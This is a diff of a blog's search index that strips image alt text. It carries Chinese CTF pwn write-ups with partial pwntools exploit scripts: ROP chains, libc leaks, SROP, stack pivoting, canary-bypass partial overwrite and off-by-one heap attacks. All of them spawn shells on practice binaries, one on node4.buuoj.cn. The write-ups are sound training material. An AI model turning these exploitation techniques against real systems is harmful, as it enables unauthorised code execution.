 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>cat flag</p>
-<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
+<p><img src="/img/image-20210501002359709.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2538,12 +2538,12 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>jarvisoj_level3_x64</title>
     <url>/2021/0711b8e0.html</url>
     <content><![CDATA[<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>检查保护机制，64位，开NX</p>
-<p><img src="/img/image-20210711122341042.png" alt="image-20210711122341042"></p>
+<p><img src="/img/image-20210711122341042.png"></p>
 <p>IDA打开，</p>
 <p>main函数</p>
-<p><img src="/img/image-20210711123946252.png" alt="image-20210711123946252"></p>
+<p><img src="/img/image-20210711123946252.png"></p>
 <p>发现function函数，找到栈溢出漏洞</p>
-<p><img src="/img/image-20210711124005975.png" alt="image-20210711124005975"></p>
+<p><img src="/img/image-20210711124005975.png"></p>
 <p>写入长度为7，读的长度为0x200</p>
 <h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.泄露read地址得到libc版本</p>
 <p>2.获取system和‘/bin/sh’的地址</p>
@@ -2552,7 +2552,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p>需要构造write(1, read_got, 8)，即将rdi=1<code>，</code>rsi=read_got<code>，</code>rdx=8</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary level3_x64 <span class="token operator">-</span><span class="token operator">-</span>only “pop<span class="token operator">|</span>ret”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/img/image-20210711132937061.png" alt="image-20210711132937061"></p>
+<p><img src="/img/image-20210711132937061.png"></p>
 <p>利用出栈指令<code>pop</code>给对应的寄存器赋值，但这里没有<code>pop rdx</code>，通过查看反汇编可以发现构造栈溢出前<code>rdx=0x200</code>，足够将<code>read</code>函数的真实地址泄露出来</p>
 <p>第二次栈溢出跳转执行<code>system("/bin/sh")</code></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -2589,7 +2589,7 @@ p<span class="token punctuation">.</span>sendlineafter<span class="token punctua
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/img/image-20210711133802398.png" alt="image-20210711133802398"></p>
+<p><img src="/img/image-20210711133802398.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2602,18 +2602,18 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>ciscn_s_3</title>
     <url>/2021/0628742.html</url>
     <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png" alt="image-20210628173000858"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
-<p><img src="/img/image-20210628173110722.png" alt="image-20210628173110722"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20210628173000858.png"></h2><p>IDA打开，查看main函数，里面只有一个vuln函数</p>
+<p><img src="/img/image-20210628173110722.png"></p>
 <p>再查看vuln函数，一个sys_read,一个sys_write,写入0x400，读0x30，这里就发现栈溢出的漏洞</p>
-<p><img src="/img/image-20210628173134218.png" alt="image-20210628173134218"></p>
+<p><img src="/img/image-20210628173134218.png"></p>
 <p>然后又发现了一个gadget函数</p>
-<p><img src="/img/image-20210628173525340.png" alt="image-20210628173525340"></p>
-<p><img src="/img/image-20210628174307696.png" alt="image-20210628174307696"></p>
+<p><img src="/img/image-20210628173525340.png"></p>
+<p><img src="/img/image-20210628174307696.png"></p>
 <h3 id="这里要注意："><a href="#这里要注意：" class="headerlink" title="这里要注意："></a>这里要注意：</h3><p>  mov      rax, 15       sys_rt_sigreturn</p>
 <p>  mov      rax, 59       sys_execve</p>
 <p>gadget函数没有被直接调用，该函数设置了rax=15并返回，推测可能和系统调用号有关。查到ubuntu18 64位系统调用号15为<strong>rt_sigreturn</strong>，用于恢复从用户态进入内核态所保存的上下文（即寄存器信息），59为<strong>execve</strong>，作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本</p>
 <h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。</p>
-<p><img src="/img/image-20210628175901200.png" alt="image-20210628175901200"></p>
+<p><img src="/img/image-20210628175901200.png"></p>
 <p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p>
 <h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -2668,17 +2668,17 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
     <title>picoctf_2018_rop</title>
     <url>/2021/07171096.html</url>
     <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
+<p><img src="/img/image-20210717100253970.png"></p>
 <p>IDA打开</p>
 <p>main函数，里面发现vuln函数</p>
-<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
-<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
+<p><img src="/img/image-20210717100706788.png"></p>
+<p><img src="/img/image-20210717100744059.png"></p>
 <h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
-<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
+<p><img src="/img/image-20210717101317225.png"></p>
 <p>win_function1函数</p>
-<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
+<p><img src="/img/image-20210717101703475.png"></p>
 <p>win_function2函数</p>
-<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
+<p><img src="/img/image-20210717101752632.png"></p>
 <h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><pre class="line-numbers language-none"><code class="language-none">需要注意点就是，有个判断 条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )，需要控制win1、win2、a1
 win1、win2可以通过调用对应的函数进行赋值，而a1是作为flag函数的参数，在栈上构造好数据即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -2705,7 +2705,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><pre class="line-numbers language-none"><code class="language-none">0xBAAAAAAD是-1163220307对应的16进制的补码作为win_function2函数的参数
 0xDEADBAAD是-559039827对应的16进制的补码作为flag函数的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
+<p><img src="/img/image-20210717103414365.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2718,11 +2718,11 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>jarvisoj_level3</title>
     <url>/2021/0628b4bb.html</url>
     <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210628222619420.png" alt="image-20210628222619420"></p>
+<p><img src="/img/image-20210628222619420.png"></p>
 <p>IDA打开，shift+F12没有找到system和’/bin/sh’，所以应该也是libc泄露</p>
 <p>查看main函数，又看到了熟悉的vulnerable_function()函数</p>
-<p><img src="/img/image-20210628222739706.png" alt="image-20210628222739706"></p>
-<p><img src="/img/image-20210628222833493.png" alt="image-20210628222833493"></p>
+<p><img src="/img/image-20210628222739706.png"></p>
+<p><img src="/img/image-20210628222833493.png"></p>
 <p>果然漏洞就在这个函数里</p>
 <p>写入长度只有7，而读的长度有0x100，漏洞很大</p>
 <p>解题思路和前几个题都类似了</p>
@@ -2778,7 +2778,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>cat flag</p>
-<p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
+<p><img src="/img/image-20210706133135129.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2791,17 +2791,17 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>pwn2_sctf_2016</title>
     <url>/2021/0706ab6e.html</url>
     <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
-<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
+<p><img src="/img/image-20210627162616928.png"></p>
 <p>尝试运行了一下</p>
-<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
+<p><img src="/img/image-20210627162846304.png"></p>
 <p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
-<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
-<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
-<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
+<p><img src="/img/image-20210627163205184.png"></p>
+<p><img src="/img/image-20210627163308598.png"></p>
+<p><img src="/img/image-20210627164147748.png"></p>
 <p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
 <p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
 <p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
-<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
+<p><img src="/img/image-20210627163859886.png"></p>
 <h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
 <p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
 <p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
@@ -2862,7 +2862,7 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
+<p><img src="/img/image-20210706132149436.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2875,16 +2875,16 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>pwn1</title>
     <url>/2021/07156e47.html</url>
     <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p>
+<p><img src="/img/image-20210715112542782.png"></p>
 <p>IDA打开，查看main函数，看到vul_function()函数</p>
-<p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p>
-<p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p>
+<p><img src="/img/image-20210715112703453.png"></p>
+<p><img src="/img/image-20210715112745902.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">虽然buf在栈上但输入的长度仅仅能够覆盖ebp和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
 <h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p>
-<p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p>
+<p><img src="/img/image-20210715113306340.png"></p>
 <p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p>
 <h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意:发现做题久了之后，libc版本的问题，如果虚拟机LibcSearcher每次搜出来的libc版本都不是想要的版本，其实有个libc-2.23就可以了，大部分题用2.23都可以跑出来，2.23yyds！</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
@@ -2931,7 +2931,7 @@ p<span class="token punctuation">.</span>sendafter<span class="token punctuation
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
+<p><img src="/img/image-20210715120438512.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2946,16 +2946,16 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <content><![CDATA[<span id="more"></span>
 <h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
 <p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
-<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
+<p><img src="/img/1643120143654.png"></p>
 <p>继续看IDA，main函数</p>
-<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
+<p><img src="/img/1643120156660.png"></p>
 <p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
 <p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
 <p>于是继续找，找到auth函数里有了一个漏洞点</p>
-<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
+<p><img src="/img/1643120168747.png"></p>
 <p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
-<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
-<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
+<p><img src="/img/1643120181750.png"></p>
+<p><img src="/img/1643120196162.png"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25390</span><span class="token punctuation">)</span>
 
@@ -2968,7 +2968,7 @@ io<span class="token punctuation">.</span>sendline<span class="token punctuation
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后</p>
-<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
+<p><img src="/img/1643120231450.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -3015,16 +3015,16 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段。<br>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
 <p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
 <h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p>
-<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
+<p><img src="/img/image-20210620201226614.png"></p>
 <p>IDA打开，F5查看main函数</p>
-<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
-<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
+<p><img src="/img/image-20210620201505692.png"></p>
+<p><img src="/img/image-20210620201559551.png"></p>
 <p>看见system函数</p>
 <p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
-<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
-<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
+<p><img src="/img/image-20210620201708611.png"></p>
+<p><img src="/img/image-20210620202004923.png"></p>
 <p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
-<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
+<p><img src="/img/image-20210620202405923.png"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
 context.log_level = "debug"
 
@@ -3042,7 +3042,7 @@ io.sendline(payload)
 io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
-<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
+<p><img src="/img/image-20210620202949778.png"></p>
 <p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
 ]]></content>
       <categories>
@@ -3149,16 +3149,16 @@ iface br0 inet dhcp
     <title>xjusec考核赛 writeup</title>
     <url>/2021/082666e9.html</url>
     <content><![CDATA[<h1 id="xjusec考核赛wp"><a href="#xjusec考核赛wp" class="headerlink" title="xjusec考核赛wp"></a>xjusec考核赛wp</h1><h2 id="REVERSE："><a href="#REVERSE：" class="headerlink" title="REVERSE："></a>REVERSE：</h2><h3 id="justbase64"><a href="#justbase64" class="headerlink" title="justbase64"></a>justbase64</h3><p>这个题是以前看见过的一个类似的题，ida打开</p>
-<p><img src="/img/image-20210825211051630.png" alt="image-20210825211051630"></p>
+<p><img src="/img/image-20210825211051630.png"></p>
 <p>这边目录看见encode_one,encode_two,encode_three三个编码，右边主函数里就是三次编码后形成的”EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG”，题目也有提示base64，但肯定不只有base64</p>
 <p>挨个看，在encode_one里面发现一个变量alphabet，肯定了base64的存在</p>
-<p><img src="/img/image-20210825211343129.png" alt="image-20210825211343129"></p>
+<p><img src="/img/image-20210825211343129.png"></p>
 <p>encode_two里面关系一张图解释</p>
-<p><img src="/img/image-20210825211513679.png" alt="image-20210825211513679"></p>
+<p><img src="/img/image-20210825211513679.png"></p>
 <p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825211744.jpg"></p>
 <p>就是这样的一个对应关系</p>
 <p>encode_three就是有个移位的问题</p>
-<p><img src="/img/image-20210825211933760.png" alt="image-20210825211933760"></p>
+<p><img src="/img/image-20210825211933760.png"></p>
 <p><img src="/img/20200911131956308.png"></p>
 <p>要还原就从three开始倒过来还原</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">m</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -3191,7 +3191,7 @@ fin2 <span class="token operator">=</span> <span class="token string">""</span>
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/img/image-20210825212900481.png" alt="image-20210825212900481"></p>
+<p><img src="/img/image-20210825212900481.png"></p>
 <p>再还原two，最后base64解码得到flag</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
 data <span class="token operator">=</span> <span class="token string">"BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD"</span>
@@ -3208,13 +3208,13 @@ raw<span class="token punctuation">[</span><span class="token number">39</span><
 
 
 <h2 id="pwn："><a href="#pwn：" class="headerlink" title="pwn："></a>pwn：</h2><h3 id="ez-pwn（partial-overwrite-部分覆盖）"><a href="#ez-pwn（partial-overwrite-部分覆盖）" class="headerlink" title="ez_pwn（partial overwrite 部分覆盖）"></a>ez_pwn（partial overwrite 部分覆盖）</h3><p>这个题我觉得一点也不简单，在拿到hint之后才借助互联网的力量把他弄出来，过程艰辛</p>
-<p><img src="/img/image-20210825212508971.png" alt="image-20210825212508971"></p>
-<p><img src="/img/image-20210825214242973.png" alt="image-20210825214242973"></p>
+<p><img src="/img/image-20210825212508971.png"></p>
+<p><img src="/img/image-20210825214242973.png"></p>
 <p>一种比较新鲜的栈溢出，叫 <strong>花式栈溢出</strong> </p>
 <p>partial overwrite：在开启了PIE后，无论高位地址如何变化，低位地址是不变的，意味着有概率“撞到”正确的地址</p>
-<p><img src="/img/image-20210825213240232.png" alt="image-20210825213240232"></p>
+<p><img src="/img/image-20210825213240232.png"></p>
 <p>主要的问题就是开启了canary，而栈溢出在第二次read函数里，有canary保护 ，read读满不会追加\0 。可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)</p>
-<p><img src="/img/image-20210825213949666.png" alt="image-20210825213949666"></p>
+<p><img src="/img/image-20210825213949666.png"></p>
 <p>同时也发现了夺权函数，那么第二次栈溢出只要返回到夺权函数地址就行了</p>
 <p>最后脚本多次的尝试才拿到了flag，因为返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为<code>0x0A3E</code>, 就有一定的几率 get shell</p>
 <h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -3236,10 +3236,10 @@ raw<span class="token punctuation">[</span><span class="token number">39</span><
 
 
 
-<h3 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h3><p><img src="/img/image-20210825214846902.png" alt="image-20210825214846902"></p>
+<h3 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h3><p><img src="/img/image-20210825214846902.png"></p>
 <p>ida打开后，看见menu函数，五个功能</p>
 <p>Create_Heap函数</p>
-<p><img src="/img/image-20210825215031703.png" alt="image-20210825215031703"></p>
+<p><img src="/img/image-20210825215031703.png"></p>
 <p>读完后发现有两次malloc，就意味着申请了两次，第一个chunk可以看作是记录的作用，里面存放着第二个chunk的size和指针，同时，第一个chunk的地址指针保存在bss段中heaparray数组这里，两个大小都是0x20的chunk，举个例子方便理解</p>
 <pre class="line-numbers language-none"><code class="language-none">0x603000: 0x0000000000000000 0x0000000000000021
 0x603010: 0x0000000000000010 0x0000000000603030 (chunk0的大小和指针）
@@ -3254,12 +3254,12 @@ raw<span class="token punctuation">[</span><span class="token number">39</span><
 0x6030a0: 0x0000000000000000 0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后是edit_heap函数</p>
-<p><img src="/img/image-20210825215827003.png" alt="image-20210825215827003"></p>
+<p><img src="/img/image-20210825215827003.png"></p>
 <p>在这里发现了off-by-one漏洞</p>
 <p>show_heap函数：</p>
-<p><img src="/img/image-20210825215943902.png" alt="image-20210825215943902"></p>
+<p><img src="/img/image-20210825215943902.png"></p>
 <p>最后的delete_heap函数读出最后会把之前申请到的两个chunk都free掉</p>
-<p><img src="/img/image-20210825220059801.png" alt="image-20210825220059801"></p>
+<p><img src="/img/image-20210825220059801.png"></p>
 <h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p><strong>1.利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。<br> 2.申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</strong></p>
 <h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -3322,14 +3322,14 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221547.png"></p>
 <p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221552.png"></p>
 <h3 id="仅仅是流量分析？"><a href="#仅仅是流量分析？" class="headerlink" title="仅仅是流量分析？"></a>仅仅是流量分析？</h3><p>根据hint</p>
-<p><img src="/img/image-20210825221847222.png" alt="image-20210825221847222"></p>
+<p><img src="/img/image-20210825221847222.png"></p>
 <p>ftm文件，rar损坏</p>
 <p>ftm文件解压点开后还有个key.pcap文件</p>
 <p>wireshark打开发现数据包，脚本得到数据包内容</p>
 <p>然后010打开rar文件，发现文件块位置错误，修改后正常解压</p>
 <p>打开发现233.png</p>
 <p>stegsolve打开233.png，逐层找，找到一个二维码，扫码后拿到flag原样，结合xinan发现是维吉尼亚密码，再解密后又是栅栏密码，最后拿到flag</p>
-<p><img src="/img/image-20210825222821574.png" alt="image-20210825222821574"></p>
+<p><img src="/img/image-20210825222821574.png"></p>
 <h3 id="可爱猫猫"><a href="#可爱猫猫" class="headerlink" title="可爱猫猫"></a>可爱猫猫</h3><p>两张表面上一样的图片</p>
 <p>盲水印的问题，用github上的脚本</p>
